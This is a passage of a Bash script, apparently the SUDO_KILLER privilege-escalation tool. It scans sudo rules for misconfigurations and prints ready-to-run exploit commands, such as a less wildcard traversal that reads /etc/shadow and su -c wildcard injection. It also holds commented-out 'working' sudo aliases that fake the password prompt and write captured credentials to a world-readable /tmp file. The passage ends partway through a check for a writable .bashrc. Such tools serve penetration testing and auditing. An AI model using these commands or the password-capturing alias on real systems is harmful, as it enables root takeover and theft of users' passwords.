  # sudo -l | grep -E '^%\w+\s+\(ALL:\w+\)\s+NOPASSWD:\s+ALL'

  # # Variant 8: user (root) NOPASSWD: */s|bin/*
  # regex for /etc/sudoers | grep -E '^\S+\s+\(root\)\s+NOPASSWD:\s+ALL'
  exprv8=$(echo "$cmd" 2>/dev/null | grep -E '\(root\)\s+NOPASSWD:\s+/*bin/')
  if [ "$exprv8" ]; then
    echo -e "${BOLD}${RED}[+] Excessive Privilege detected [Variant 8]${RESET}"
    echo -e "[-] Variant 8: $who (root) NOPASSWD: */|bin/*"
    echo -e "[-] Identified rule: \n$exprv8"
    echo -e "[-] Impersonate: ${BOLD}${BLUE}root${RESET}"
    echo -e "[-] Password required: ${BOLD}${BLUE}No${RESET}"
    echo -e "[-] Command/bin: ${BOLD}${BLUE}Listed one from identified rule${RESET}"
    echo -e "[*] Notes: notes/execessive_priv.txt \n"
  fi

}

fn_excess_priv_pwd() {

  # Variant 1: user (ALL) ALL
  # regex for /etc/sudoers | grep -E '^\S+\s+\(ALL\)\s+ALL'
  exprv11=$(echo "$cmd" 2>/dev/null | grep -E '\(ALL\)\s+ALL' | grep -v "PASSWD")
  if [ "$exprv11" ]; then
    echo -e "${BOLD}${RED}[+] Excessive Privilege detected [Variant 1]${RESET}"
    echo -e "[-] Variant 1: $who (ALL)  ALL"
    echo -e "[-] Identified rule: \n$exprv11"
    echo -e "[-] Impersonate: ${BOLD}${BLUE}Any user${RESET}"
    echo -e "[-] Password required: ${BOLD}${BLUE}Yes (any account)${RESET}"
    echo -e "[-] Command/bin: ${BOLD}${BLUE}Any${RESET}"
    echo -e "[*] Notes: notes/execessive_priv.txt \n"
  fi

  # Variant 4/5: user (ALL)  /usr/bin/command
  # regex for /etc/sudoers | grep -E '^\S+\s+\(ALL\)\s+/usr/bin/\w+'
  exprv451=$(echo "$cmd" 2>/dev/null | grep -E '\(ALL\)\s+/*bin*' | grep -v "PASSWD")
  if [ "$exprv451" ]; then
    echo -e "${BOLD}${RED}[+] Excessive Privilege detected [Variant 4/5]${RESET}"
    echo -e "[-] Variant 4/5: $who (ALL)  */s|bin/*"
    echo -e "[-] Identified rule: \n$exprv451"
    echo -e "[-] Impersonate: ${BOLD}${BLUE}Any user${RESET}"
    echo -e "[-] Password required: ${BOLD}${BLUE}Yes (any account)${RESET}"
    echo -e "[-] Command/bin: ${BOLD}${BLUE}Listed one from identified rule${RESET}"
    echo -e "[*] Notes: notes/execessive_priv.txt \n"
  fi

  # # Variant 2: %group (ALL)  ALL - (ALL : ALL)  ALL
  # # regex for /etc/sudoers | grep -E '^%\w+\s+\(ALL\)\s+ALL'
  exprv21=$(echo "$cmd" 2>/dev/null | grep -E '\(ALL \: ALL\)\s+ALL' | grep -v "PASSWD")
  if [ "$exprv21" ]; then
    echo -e "${BOLD}${RED}[+] Excessive Privilege detected [Variant 2]${RESET}"
    echo -e "[-] Variant 2: %group (ALL)  ALL"
    echo -e "[-] Identified rule: \n$exprv21"
    echo -e "[-] Impersonate: ${BOLD}${BLUE}Any user or group${RESET}"
    echo -e "[-] Password required: ${BOLD}${BLUE}Yes (any account)${RESET}"
    echo -e "[-] Command/bin: ${BOLD}${BLUE}Any${RESET}"
    echo -e "[*] Notes: notes/execessive_priv.txt \n"
  fi

  # # Variant 6: %group (ALL)  /sbin/reboot, /sbin/shutdown
  # regex for /etc/sudoers | grep -E '^%\w+\s+\(ALL\)\s+/*bin/\*'
  exprv61=$(echo "$cmd" 2>/dev/null | grep -E '\(ALL \: ALL\)\s+/*bin*' | grep -v "PASSWD")
  if [ "$exprv61" ]; then
    echo -e "${BOLD}${RED}[+] Excessive Privilege detected [Variant 6]${RESET}"
    echo -e "[-] Variant 6: %group (ALL)  */s|bin/*"
    echo -e "[-] Identified rule: \n$exprv61"
    echo -e "[-] Impersonate: ${BOLD}${BLUE}Any user or group${RESET}"
    echo -e "[-] Password required: ${BOLD}${BLUE}Yes (any account)${RESET}"
    echo -e "[-] Command/bin: ${BOLD}${BLUE}Listed one from identified rule${RESET}"
    echo -e "[*] Notes: notes/execessive_priv.txt \n"
  fi

}

fn_chown() {
  #sudochownrec=`echo '' | sudo -S -l -k 2>/dev/null | grep "(root) NOPASSWD:" | grep "/bin/chown -hR"`
  sudochownrec=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep "/bin/chown -hR")
  if [ "$sudochownrec" ]; then
    echo -e "${BOLD}${GREEN}[+] Sudo chown with recursive, was found: ${RESET}"
    echo -e "$sudochownrec"
    echo -e "\n[-] You can change the owner of directories, refer to notes/chown-hR.txt for exploitation\n"
    echo -e "[-] run the command: sudo chown -hR [new_owner:old_owner] [/parent/children] "
    echo -e "[-] Can be combined with other misconfig for complete privilege escalation such as wildcard(script)/missing script \n"
    # echo -e "[-] you can then modify or create .sh script that can be run with root right "
    # echo -e "[-] #! /bin/bash "
    # echo -e "[-] bash "
    # echo -e "[-] sudo ./[appp].sh \n"
  fi

  sudochown=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep "/bin/chown")
  if [ "$sudochown" ]; then
    echo -e "${BOLD}${GREEN}[+] Sudo chown, was found: ${RESET}"
    echo -e "$sudochown"
    echo -e "\n[-] You can change the owner of directories, refer to notes/chown-hR.txt for exploitation\n "
  fi
}

fn_impersonate() {
  #sudoimpuser=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep -w "/bin/su")
  #sudoimpuser=$(echo "$cmd" 2>/dev/null | grep "NOPASSWD:" | grep -iw "/*bin/su *")
  sudoimpuser=$(echo "$cmd" 2>/dev/null | grep "NOPASSWD:" | grep -iw "/*bin/su *" | grep -v "su root\|su - root" | grep -v "/*bin/su -$\|/*bin/su \*$\|/*bin/su \- \*$")

  if [ "$sudoimpuser" ]; then
    echo -e "${BOLD}${RED}[-] Potential user impersonation detected!${RESET}"
    echo -e "${BOLD}${GREEN}[+] User Impersonation : command su found within sudo's rules: ${RESET}"
    echo -e "$sudoimpuser"
    echo -e "\n[-] You can impersonate users, by running the cmd: sudo su - [USER] "
    echo -e "[+] Run the SUDO_KILLER AGAIN after impersonating a user!"
    echo -e "[*] Notes: notes/user_impersonation.txt \n"
  fi

  sudoimproot=$(echo "$cmd" 2>/dev/null | grep "NOPASSWD:" | grep -iw "/bin/su -$\|/bin/su - \*$\|/bin/su \*$\|/bin/su root$\|/*bin/su - root,")
  if [ "$sudoimproot" ]; then
    echo -e "${BOLD}${RED}[-] Potential root impersonation detected!${RESET}"
    echo -e "${BOLD}${GREEN}[+] Root Impersonation : command su found within sudo's rules: ${RESET}"
    echo -e "$sudoimproot"
    echo -e "\n[-] You can impersonate root, by running the cmd:\n ${BOLD}${BLUE}sudo su -${RESET} or ${BOLD}${BLUE}sudo su - root${RESET} or ${BOLD}${BLUE}sudo su${RESET} or ${BOLD}${BLUE}sudo su root${RESET}"
    echo -e "[+] Run the SUDO_KILLER AGAIN after impersonating a user!"
    echo -e "[*] Notes: notes/user_impersonation.txt \n"
  fi
  # sudo -l | grep "NOPASSWD"| grep -i "/bin/su -$"
  # sudo -l | grep "NOPASSWD"| grep -i "/bin/su - \*$"

  # check1=$(sudo -l | grep "NOPASSWD: /bin/su - root -c")
  # check2=$(sudo -l | grep "NOPASSWD: /bin/su - root -c" | cut -d/ -f 5- | cut -d " " -f 1 | grep "\*")
  # check3=$(sudo -l | grep "NOPASSWD: /bin/su - root -c" | cut -d/ -f 5- | cut -d " " -f 2 | grep "\*")

  # if [ -n "$check1" ] && [ -n "$check2" ] && [ -n "$check3" ]; then

  #   var1="/bin/su - root -c "
  #   var2=$(sudo -l | grep "NOPASSWD: /bin/su - root -c" | cut -d ":" -f 2 | sed 's/ \/bin\/su - root -c //g' | sed 's/\*/DUMP/g')
  #   var2=\"${var2}\;id\"

  #   echo -e "${BOLD}${RED}[-] Vulnerable to a misconfiguration (wildcard + impersonation) ${RESET}"
  #   echo -e "[+] This misconfiguration which includes wildcard and impersonation allow to PE to root "
  #   echo -e "$check1"
  #   echo -e "[*] Exploit: run the command below:"
  #   echo -e "[*] sudo $var1$var2"
  #   echo -e "\n"

  # fi

}

fn_userimp() {
  # comment due to issue > Checking sudo without password #9
  #sudonopassuser==`echo '' | sudo -S -l -k 2>/dev/null | grep "NOPASSWD:" | grep "/bin\|/sbin"`
  #sudonopassuser=$(echo "$cmd" 2>/dev/null | grep "NOPASSWD:" | grep -v "root" | sed 's/NOPASSWD//g' | sed 's/(//g' | sed 's/)//g' | sed 's/://g')
  sudonopassuser=$(echo "$cmd" 2>/dev/null | grep "NOPASSWD:" | grep -v "(root)\|(ALL" | sed 's/NOPASSWD//g' | sed 's/(//g' | sed 's/)//g' | sed 's/://g' | sort -u)
  if [ "$sudonopassuser" ]; then
    echo -e "${BOLD}${GREEN}[+] Can impersonate non-root user: ${RESET}"
    echo -e "$sudonopassuser"
    echo -e "[-] You can impersonate users, by running the cmd: sudo -u [USER] /path/bin"
    echo -e "[-] Refer to section [Dangerous bins to escalate to other users] for the exact commands \n"
  fi
}

fn_wildcard() {
  # grep '*/\|/*\|*'  or | grep '*/"\|"/*"\|"*''
  #sudowildcard=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep '*/\|/*\|*' )
  #sudowildcard=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep '\*' )
  sudowildcard=$(echo "$cmd" 2>/dev/null | grep "NOPASSWD:" | grep "(root)\|(ALL)\|(ALL : ALL)" | grep '\*')
  if [ "$sudowildcard" ]; then
    echo -e "${BOLD}${GREEN}[+] Wildcard was found in sudo's rules: ${RESET}"
    echo -e "$sudowildcard \n"
  fi

  #sudowildcardsh=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep "\*" | grep ".sh")
  sudowildcardsh=$(echo "$cmd" 2>/dev/null | grep "NOPASSWD:" | grep "(root)\|(ALL)\|(ALL : ALL)" | grep '\*' | grep ".sh")
  if [ "$sudowildcardsh" ]; then
    echo -e "${BOLD}${GREEN}[+] Wildcard with a bash script was found in sudo's rules: ${RESET}"
    echo -e "$sudowildcardsh \n"
  fi

 sudowildcardless=$(echo "$cmd" 2>/dev/null | grep "less")
   if [ "$sudowildcardless" ]; then
       exploit1_sudowildcardless=$(echo "$cmd" 2>/dev/null | grep less | cut -d ":" -f 2- | sed 's/*$/dump \/etc\/shadow/g' | sed s'/*/dump/g')   
       exploit2_sudowildcardless=$(echo "$cmd" 2>/dev/null | grep less | cut -d ":" -f 2- | sed 's/*$/..\/..\/..\/..\/..\/etc\/shadow/g' | sed s'/*/dump/g')   
       sudowildcardlesspwd=$(echo "$sudowildcardless" 2>/dev/null | grep "PASSWD")
        if [ "$sudowildcardlesspwd" ]; then
          echo -e "${BOLD}${GREEN}[+] Wildcard with less command detected ${RESET}${BLUE}(No password required!): ${RESET}"
          echo -e "$sudowildcardless \n"
          echo -e "Exploit1: sudo$exploit1_sudowildcardless"
          echo -e "Exploit2: sudo$exploit2_sudowildcardless\n"
       else
          echo -e "${BOLD}${GREEN}[+] Wildcard with less command detected (Password required!): ${RESET}"
          echo -e "$sudowildcardless \n"
          echo -e "Exploit1: sudo$exploit1_sudowildcardless"
          echo -e "Exploit2: sudo$exploit2_sudowildcardless\n"
       fi
   fi

  sudowildcardimpr=$(echo "$cmd" 2>/dev/null | grep "/bin/su" | grep " -c " | grep "*$" )
   if [ "$sudowildcardimpr" ]; then

        sudowildcardimprpwd=$(echo "$sudowildcardimpr" 2>/dev/null | grep "PASSWD")
        if [ "$sudowildcardimprpwd" ]; then
          sudowildcardimprpwd1=$(echo "$cmd" 2>/dev/null | grep "/bin/su" | grep " -c " | cut -d ":" -f 2 | grep "*$" |  sed 's/ -c / -c \"/g' |sed 's/*$/dump;id\"/g' | sed 's/*/dump/g')
          echo -e "${BOLD}${GREEN}[+] Wildcard with su detected ${RESET}${BLUE}(No password required!): ${RESET}"
          echo -e "$sudowildcardimpr \n"
          echo -e "Exploit: sudo$sudowildcardimprpwd1"
        else
          sudowildcardimprpwd2=$(echo "$cmd" 2>/dev/null | grep "/bin/su" | grep " -c " | grep "*$" | sed 's/ -c / -c \"/g' | sed 's/*$/dump;id\"/g' | sed 's/*/dump/g')
           echo -e "${BOLD}${GREEN}[+] Wildcard with su detected (Password required!): ${RESET}"
          echo -e "$sudowildcardimpr \n"
          echo -e "Exploit: sudo$sudowildcardimprpwd2"
        fi
   fi

}

fn_sinject() {
  #### Sudo Injection
  sudoinj=$(cat /proc/sys/kernel/yama/ptrace_scope | grep 0 2>/dev/null)
  if [ "$sudoinj" ]; then
    echo -e "${BOLD}${GREEN}[+] Ptrace is set to zero:  ${RESET}"
    echo -e "[-] All processes can be debugged, as long as they have same uid"
    echo -e "[-] It is possible to inject process that have valid sudo token and activate our own sudo token."
    echo -e "[*] Notes: refer to: https://github.com/nongiach/sudo_inject for more information"
    echo -e "[*] Exploit: res/sudo_injec \n"
  fi
}

fn_scache() {
  sudocache=$(echo "$cmd" 2>/dev/null | grep " !tty_tickets")
  if [ "$sudocache" ]; then
    echo -e "${BOLD}${GREEN}[+] Checking whether sudo caching is possible: ${RESET}"
    echo -e "[-] Potentially vulnerable to MITRE Attack TTP T1548.003"
    echo -e "[*] Notes: notes/sudo_caching.txt"
    echo -e "\n"
  fi
}

fn_fileownhijack() {
  #####  Chown file reference trick (file owner hijacking)
  #sudowildcardchown=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep "*" | grep "chown")
  sudowildcardchown=$(echo "$cmd" 2>/dev/null | grep "NOPASSWD:" | grep "*" | grep "*bin/chown\|chown ")
  if [ "$sudowildcardchown" ]; then
    echo -e "${BOLD}${GREEN}[+] Wildcard with chown was found in sudo's rules: ${RESET} "
    echo -e "$sudowildcardchown"
    echo -e "\n[-] ${BOLD}${RED}File owner hijacking possible.${RESET} "
    echo -e "[*] Exploit: notes/file_owner_hijacking(chown).txt \n"
  fi

  #####  tar file reference trick (file owner hijacking)
  #sudowildcardtar=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep "*" | grep "tar")
  sudowildcardtar=$(echo "$cmd" 2>/dev/null | grep "NOPASSWD:" | grep "*" | grep "*bin/tar\|tar ")
  if [ "$sudowildcardtar" ]; then
    echo -e "${BOLD}${GREEN}[+] Wildcard with tar was found in sudo's rules: ${RESET}"
    echo -e "$sudowildcardtar"
    echo -e "\n[-] ${BOLD}${RED}File owner hijacking possible.${RESET} "
    echo -e "[*] Exploit: notes/file_owner_hijacking(tar).txt \n"
  fi

  #####  rsync file reference trick (file owner hijacking)
  #sudowildcardrsync=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep "*" | grep "rsync")
  sudowildcardrsync=$(echo "$cmd" 2>/dev/null | grep "NOPASSWD:" | grep "*" | grep "*bin/rsync\|rsync ")
  if [ "$sudowildcardtar" ]; then
    echo -e "${BOLD}${GREEN} [+] Wildcard with rsync was found in sudo's rules:  ${RESET}"
    echo -e "$sudowildcardrsync"
    echo -e "\n[-] ${BOLD}${RED}File owner hijacking possible.${RESET} "
    echo -e "[*] Exploit: notes/file_owner_hijacking(rsync).txt \n"
  fi
}

fn_filepermhijack() {

  #####  Chmod file reference trick(file permission hijacking)
  #sudowildcardchmod=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep "*" | grep "chmod")
  sudowildcardchmod=$(echo "$cmd" 2>/dev/null | grep "NOPASSWD:" | grep "*" | grep "*bin/chmod\|chmod ")
  if [ "$sudowildcardchmod" ]; then
    echo -e "${BOLD}${GREEN} [+] Wildcard with chmod was found in the sudoers file: ${RESET}"
    echo -e "$sudowildcardchmod"
    echo -e "\n[-] ${BOLD}${RED}File permission hijacking possible.${RESET} "
    echo -e "[*] Exploit: notes/file_permission_hijacking.txt \n"
  fi

}

checkmisconfig() {
  echo -e "${BOLD}${YELLOW}[4/21] ====== Checking for excessive privilege ====== ${RESET} \n"
  fn_excess_priv

  echo -e "${BOLD}${BLUE}\n[@] Check [4/21] Completed!${RESET} \n"

  echo -e "${BOLD}${YELLOW}[5/21] ====== Checking for excessive privilege (a password required) ====== ${RESET} \n"
  fn_excess_priv_pwd

  echo -e "${BOLD}${BLUE}\n[@] Check [5/21] Completed!${RESET} \n"

  echo -e "${BOLD}${YELLOW}[6/21] ====== Checking for Common Misconfiguration (User impersonation) ====== ${RESET} \n"
  fn_impersonate
  echo -e "${BOLD}${BLUE}\n[@] Check [6/21] Completed!${RESET} \n"

  echo -e "${BOLD}${YELLOW}[7/21] ====== Checking for Common Misconfiguration (Change owner) ====== ${RESET} \n"
  fn_chown
  echo -e "${BOLD}${BLUE}\n[@] Check [7/21] Completed!${RESET} \n"

  echo -e "${BOLD}${YELLOW}[8/21] ====== Checking for Common Misconfiguration (Wildcard) ====== ${RESET} \n"
  fn_wildcard
  echo -e "${BOLD}${BLUE}\n[@] Check [8/21] Completed!${RESET} \n"

  echo -e "${BOLD}${YELLOW}[9/21] ====== Checking for Common Misconfiguration (Sudo Injection) ====== ${RESET} \n"
  fn_sinject
  echo -e "${BOLD}${BLUE}\n[@] Check [9/21] Completed!${RESET} \n"

  echo -e "${BOLD}${YELLOW}[10/21] ====== Checking for Common Misconfiguration (Sudo Cache) ====== ${RESET} \n"
  fn_scache
  echo -e "${BOLD}${BLUE}\n[@] Check [10/21] Completed!${RESET} \n"

  echo -e "${BOLD}${YELLOW}[11/21] ====== Checking for Common Misconfiguration (File Owner Hijacking) ====== ${RESET} \n"
  fn_fileownhijack
  echo -e "${BOLD}${BLUE}\n[@] Check [11/21] Completed!${RESET} \n"

  echo -e "${BOLD}${YELLOW}[12/21] ====== Checking for Common Misconfiguration (File Permission Hijacking) ====== ${RESET} \n"
  fn_filepermhijack
  echo -e "${BOLD}${BLUE}\n[@] Check [12/21] Completed!${RESET} \n"

} # checkmisconfig

#------------------------------------------------------

fn_miss_scripts() {
  # offline mode check
  if [ "$import" ]; then
    echo -e "${BOLD}${GREEN}[/] This check is excluded in the offline mode for now. ${RESET}"

  else
    :
    current_user="$(whoami)"

    groups >/tmp/groups.txt

    # issue #10 > missing check on NOPAASWD
    #sudo -S -l -k | grep "NOPASSWD" | sed 's/(root) //g' | sed 's/NOPASSWD: //g' | sed 's/,/\n/g'  | sed -e 's/  *$//' | awk '$1=$1' | cut -d " " -f 1 | grep .sh  > $vpath/script_list
    #echo "$cmd" | grep "NOPASSWD" | sed 's/(root) //g' | sed 's/NOPASSWD: //g' | sed 's/,/\n/g'  | sed -e 's/  *$//' | awk '$1=$1' | cut -d " " -f 1 | grep .sh  > $vpath/script_list
    echo "$cmd" | sed 's/(root) //g' | sed 's/NOPASSWD: //g' | sed 's/,/\n/g' | sed -e 's/  *$//' | awk '$1=$1' | cut -d " " -f 1 | grep .sh >$vpath/script_list
    #echo -e "${BOLD}${GREEN}[+] The script/s found in sudoers can be found at: $vpath/script_list  ${RESET}"
    echo -e "${BOLD}${GREEN}[+] The script/s found in sudoers can be found at: $vpath/script_list  ${RESET}"

    #### Check for missing scripts that exists in the sudoers file and whether the current user is the owner of directory
    echo -e "[+] Checking whether there are any missing scripts defined in sudoers but that no longer exists on system:"

    #echo -e "\n --------------------------------------------------------------"
    #cat $vpath/script_list | while read line
    cat $vpath/script_list | while read line; do

      #test
      #echo $line

      # missing file/script
      if [ ! -f $line ]; then

        rep=$(echo "$line" | awk -F.sh '{print $1}' | rev | cut -d "/" -f 2,3,4,5,6,7 | rev | cut -d " " -f 2)

        echo -e "\n"
        echo -e "------------------------------------------------------------------"
        echo -e "[++] Missing script found:"
        echo $line
        echo -e "\n"

        echo -e ">>> Checking Directory User Ownership of the missing script"

        #### checking whether the current user is the owner of the directory and his rights
        repexist=$(echo '' | ls -ld $rep)
        direc_user=$(echo "$repexist" | cut -d " " -f 3)

        # r- ls on directory / w- create file / x- access the directory
        drights=$(echo "$repexist" | cut -d " " -f 1)

        # checking the owner of the directory is the current user
        if [ "$current_user" == "$direc_user" ]; then
          echo -e "${BOLD}${RED}[+] The current user is the directory owner of the missing file.${RESET}"

          #### checking the permission on the directory that the owner/current user has

          drightsr=${drights:1:1}
          drightsw=${drights:2:1}
          drightsx=${drights:3:1}

          # echo $drightsr
          # echo $drightsw
          # echo $drightsx

          msgright1="The current user has the right to: "

          if [ "$drightsr" == "r" ]; then
            msgright1+=" list since r (ls)"
          fi

          if [ "$drightsw" == "w" ]; then
            msgright1+=", access w (cd) "
          fi

          if [ "$drightsx" == "x" ]; then
            msgright1+=" and x create/move file/directory"
          fi

          #msgright1+=$line

          echo -e "[-] $msgright1"
          echo -e "[*] Exploit, refer to notes/owner_direc_missing_file.txt and notes/Excessive_directory_rights.txt \n"

        else
          echo -e "[-] The user $direc_user is the directory owner of the missing file. \n"
        fi # current user

        echo -e ">>> Checking Directory Group Ownership of the missing scripts"
        # checking whether the current user is part of the group owner of the directory
        direc_grp=$(echo "$repexist" | cut -d " " -f 4)

        cat /tmp/groups.txt | while read line1; do
          if [ "$line1" == "$direc_grp" ]; then

            echo -e "${BOLD}${RED}[+] The current user is in a group that is the directory owner of the missing file.${RESET}"

            dgrightsr=${drights:4:1}
            dgrightsw=${drights:5:1}
            dgrightsx=${drights:6:1}

            msgright="The current user is in a group which can "

            if [ "$dgrightsr" == "r" ]; then
              msgright+="list since r (ls)"
            fi

            if [ "$dgrightsw" == "w" ]; then
              msgright+=", access w (cd) "
            fi

            if [ "$dgrightsx" == "x" ]; then
              msgright+=" and x create/move file/directory. \n"
            fi

            #msgright+=$line

            echo -e "[-] $msgright"
            echo -e "[*] Exploit, refer to notes/owner_direc_missing_file.txt "
            #echo -e "-------------------------------------------------------"
            break
          fi
        done

      fi # check file missing

    done

    echo -e "\n"
  fi # check offline mode

}

fn_excessive_dir_perm() {

  # offline mode check
  if [ "$import" ]; then
    echo -e "${BOLD}${GREEN}[/] This check is excluded in the offline mode for now. ${RESET}"

  else
    :

    #echo -e "${BOLD}${GREEN}[+] The script/s found in sudoers can be found at: $vpath/script_list.txt ${RESET}"
    echo -e "${BOLD}${GREEN}[+] The script/s found in sudoers can be found at: $vpath/script_list  ${RESET}"

    echo -e "-------------------------------------------------------"

    #cat $vpath/script_list | while read liney
    cat $vpath/script_list | while read liney; do

      ####### [DIRECTORY]

      # checking the directory rights of the scripts identified in sudo
      if [ -f $liney ]; then
        rep1=$(echo "$liney" | awk -F.sh '{print $1}' | rev | cut -d "/" -f 2,3,4,5,6,7 | rev | cut -d " " -f 2)

        echo -e "\n"
        echo "[++] Checking the directory rights for the script:"
        echo "$liney"
        echo -e "\n"

        echo -e ">>> Checking Directory User Ownership of the scripts"

        #### checking whether the current user is the owner of the directory and his rights
        repexist1=$(echo '' | ls -ld $rep1)
        direc_user1=$(echo "$repexist1" | cut -d " " -f 3)

        # r- ls on directory / w- create file / x- access the directory
        drights1=$(echo "$repexist1" | cut -d " " -f 1)

        # checking the owner of the directory is the current user
        if [ "$current_user" == "$direc_user1" ]; then
          echo -e "${BOLD}${RED}[+] The current user is the directory owner of the script.${RESET}"

          #### checking the permission on the directory that the owner/current user has

          drightsr1=${drights1:1:1}
          drightsw1=${drights1:2:1}
          drightsx1=${drights1:3:1}

          msgright2="The current user has the right to: "

          if [ "$drightsr1" == "r" ]; then
            msgright2+=" list since r (ls)"
          fi

          if [ "$drightsw1" == "w" ]; then
            msgright2+=", access w (cd) "
          fi

          if [ "$drightsx1" == "x" ]; then
            msgright2+="and x create/move file/directory "
          fi
          #msgright2+="for the script : \n"
          #msgright2+=$liney

          echo -e "[-] $msgright2"
          echo -e "[*] Exploit, refer to /notes/Excessive_directory_rights.txt \n"

        else
          echo -e "[-] The user $direc_user1 is the directory owner of the missing file. \n"
        fi # current user

        echo -e ">>> Checking Directory Group Ownership of the scripts"
        # checking whether the current user is part of the group owner of the directory
        direc_grp1=$(echo "$repexist1" | cut -d " " -f 4)

        cat /tmp/groups.txt | while read linet; do
          if [ "$linet" == "$direc_grp1" ]; then

            echo -e "${BOLD}${GREEN}[+] The current user is in a group that is the directory owner of the script.${RESET}"

            dgrightsr1=${drights1:4:1}
            dgrightsw1=${drights1:5:1}
            dgrightsx1=${drights1:6:1}

            msgright3="The current user is in a group which can "

            if [ "$dgrightsr1" == "r" ]; then
              msgright3+="list since r (ls)"
            fi

            if [ "$dgrightsw1" == "w" ]; then
              msgright3+=", access w (cd) "
            fi

            if [ "$dgrightsx1" == "x" ]; then
              msgright3+=" and x create/move file/directory. "
            fi

            #msgright3+=$liney

            echo -e "[-] $msgright3"
            echo -e "[*] Exploit, refer to notes/Excessive_directory_rights.txt \n"
            break
          fi
        done

        echo -e " \n ------------------------------------------------"

      fi

    done
  # clear the scripts list
  # rm /tmp/sh_list.txt

  fi # offline mode check
}

fn_writeable_script_perm() {

  # offline mode check
  if [ "$import" ]; then
    echo -e "${BOLD}${GREEN}[/] This check is excluded in the offline mode for now. ${RESET}"

  else
    :

    ####### [FILE]

    ##### Check for writable scripts by current users from the sudoers file

    #current_user="$(whoami)"
    #current_groups="$(groups)"

    #groups > /tmp/groups.txt

    #sudo -S -l -k | grep .sh | sed 's/(root) //g' | sed 's/NOPASSWD: //g' | sed 's/,/\n/g' |  tr -d " \t\r" | grep ".sh" > /tmp/sh_list.txt

    cat $vpath/script_list | while read linex; do

      # if script exist
      if [[ -f ${linex} ]]; then

        # owner of each file/script
        owner_file=$(echo '' | ls -l $linex | cut -d " " -f 3 2>/dev/null)

        shperms=$(ls -l "$linex")

        if [ "$current_user" == "$owner_file" ]; then

          echo -e ">>> Checking current user permission on the scripts owned by him \n"
          echo -e "Checking the following script: $linex"
          #echo -e "\n"

          msgfp="The current user can "

          #shperms=$( ls -l "$linex" )
          #perm_user=$( echo "$shperms" | cut -d "-" -f 2 )

          frightsr=${shperms:1:1}
          frightsw=${shperms:2:1}
          frightsx=${shperms:3:1}

          if [[ $frightsr = "r" ]]; then
            msgfp+="read the file (r), "

          fi # perms

          if [[ $frightsw = "w" ]]; then
            msgfp+="modify the file (w), "

          fi # perms

          if [[ $frightsx = "x" ]]; then
            msgfp+="and can execute the file (x)"

          fi # perms

          msgfp+=" for the script $linex"

          echo -e "${BOLD}${GREEN}[+] $msgfp${RESET} \n"

          # clear var
          owner_file="nothing"

        fi # user owner check

        #############################################################

        # checking whether the current user is part of the group owner of the directory
        direc_grp1=$(echo "$shperms" | cut -d " " -f 4)

        #echo $shperms
        #echo $direc_grp1

        cat /tmp/groups.txt | while read line2; do
          if [ "$line2" == "$direc_grp1" ]; then
            echo -e ">>> Checking current user group ownership of the script \n"
            #echo -e ">>> Checking current user group permission on file \n"
            echo -e "${BOLD}${RED}[-] The current user is part of a group or several groups that is the owner of the script, the groups are: $line2${RESET}"
            #echo -e "[-] The current user is in a group that is the file owner of the script."
            # echo -e "[+] Exploit, refer to /notes/owner_direc_missing_file.txt "

            # drightsgrp=${drights:5:3}

            fgrightsr=${shperms:4:1}
            fgrightsw=${shperms:5:1}
            fgrightsx=${shperms:6:1}

            msgfgright="The current user can "

            if [ "$fgrightsr" == "r" ]; then
              msgfgright+="read the file (r), "
            fi

            if [ "$fgrightsw" == "w" ]; then
              msgfgright+="modify the file (w), "
            fi

            if [ "$fgrightsx" == "x" ]; then
              msgfgright+="and can execute the file (x). "
            fi

            msgfgright+=$linex

            direc_grp1="nothing"

            #if [[ $drightsgrp = "rwx" ]]
            #  then
            #    echo -e "[-] $drightsgrp > The current user is in a group which can list if r (ls), access w (cd) and x create/move file/directory in the directory $line."
            echo -e "[+] $msgfgright"
            echo -e "[*] Exploit, refer to notes/owner_direc_missing_file.txt \n"
          #fi # permission
          # break
          fi # group owner check
        done

      fi # exists

    done

  fi # offline mode check

}

checkmissing() {

  echo -e "${BOLD}${YELLOW}[13/21] ====== Checking for Missing scripts from sudo's rules ====== ${RESET} \n"
  fn_miss_scripts
  echo -e "${BOLD}${BLUE}\n[@] Check [13/21] Completed!${RESET} \n"

  echo -e "${BOLD}${YELLOW}[14/21] ====== Checking for excessive directory's permission ====== ${RESET} \n"
  fn_excessive_dir_perm
  echo -e "${BOLD}${BLUE}\n[@] Check [14/21] Completed!${RESET} \n"

  echo -e "${BOLD}${YELLOW}[15/21] ====== Checking for Writable scripts from sudo's rules ====== ${RESET} \n"
  fn_writeable_script_perm
  echo -e "${BOLD}${BLUE}\n[@] Check [15/21] Completed!${RESET} \n"

} # checkmissing

#------------------------------------------------------

## WP
## alias sudo='read -s -p Password: && echo -e "\n" && echo -e "$password" >/tmp/su.log 2>/dev/null && /usr/local/bin/sudo $@'
## alias sudo='echo -n "Password: " && read -s password && echo -e "\n" && echo "$USER:$password" >>/tmp/sk.hvest.log && chmod 777 /tmp/sk.hvest.log && /usr/local/bin/sudo $@'
## alias sudo='echo -n "[sudo] password for $USER: " && read -r password && echo "$password" >/tmp/su && /usr/bin/sudo $@'

## Working
#[v1] alias sudo='echo -n "[sudo] password for $USER: " && echo -e "\n" && read -s -r password && echo "$USER:$password" >>/tmp/sk-crds.log; chmod 777 /tmp/sk-crds.log && $(which sudo) $@'
#[v2] alias sudo='echo -n "Password: " && echo -e "\n" && read -s -r password && echo "$USER:$password" >>/tmp/sk-crds.log; chmod 777 /tmp/sk-crds.log && $(which sudo) $@'

fn_cred_harvest() {
  # offline mode check
  if [ "$import" ]; then
    echo -e "${BOLD}${GREEN}[/] This check is excluded in the offline mode for now. ${RESET}"

  else
    :

    echo "Current User: $current_user"
    current_user="$(whoami)"
    #echo $current_user

    hdir=$(echo "" | ls -al /home/$current_user/.bashrc)
    wo=${hdir:2:1}
    wg=${hdir:5:1}
    wa=${hdir:8:1}

    if [ "$wo" == "w" ]; then
      echo "Current user is the owner and can write to the bashrc file"
